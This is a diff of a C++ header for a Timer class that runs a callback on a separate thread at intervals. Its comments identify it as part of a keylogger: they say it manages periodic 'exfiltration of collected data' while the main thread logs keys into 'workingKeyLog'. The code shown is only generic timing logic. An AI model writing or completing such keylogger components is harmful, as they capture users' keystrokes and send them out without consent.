@@ -5,27 +5,30 @@
 #include <thread>
 #include <functional>
 
+/*
+
+This header file will include the functionality used to create new threads and manage the exfiltration
+of collected data at certain intervals
+
+*/
+
 class Timer
 { 
-	//Our new thread
+	// Our new thread
 	std::thread newThread;
 
 	bool timerRunning = false;
 	
-	//How many times should the function be run
-
+	// How many times should the function be run
 	long executionCount = -1L;
 
-	//How many times has the function been run in total
-	
+	// How many times has the function been run in total
 	long historicalCount = -1L;
 
-	//How long should the wait be before executions
-	
+	// How long should the wait be before executions
 	std::chrono::milliseconds executionInterval = std::chrono::milliseconds(0);
 	
-	//A new container (and a function to return it) that can store any callable objects including functions, lambdas, etc...
-
+	// A new container (and a function to return it) that can store any callable objects including functions, lambdas, etc...
 	std::function<void(void)> functionContainer = nullptr;
 
 	const std::function<void(void)> &getFunctionContainer() const
@@ -33,11 +36,11 @@ class Timer
 		return functionContainer;
 	}
 
-	//Checks if the timer is running, retrieves the function container, and executes the first function inside it
+	// Checks if the timer is running, retrieves the function container, and executes the first function inside it
 
 	void sleepNRun()
 	{
-		//Go to sleep while the main thread logs keys and fills up workingKeyLog
+		// Go to sleep while the main thread logs keys and fills up workingKeyLog
 
 		std::this_thread::sleep_for(executionInterval);
 
@@ -47,7 +50,7 @@ class Timer
 		}
 	}
 
-	//threadFunction will be executed on the new thread
+	// threadFunction will be executed on the new thread
 
 	void threadFunction()
 	{
@@ -111,7 +114,7 @@ class Timer
 		{
 			timerRunning = false;
 
-			//Resync execution by waiting for the newly created thread to complete execution
+			// Resync execution by waiting for the newly created thread to complete execution
 
 			newThread.join();
 		}
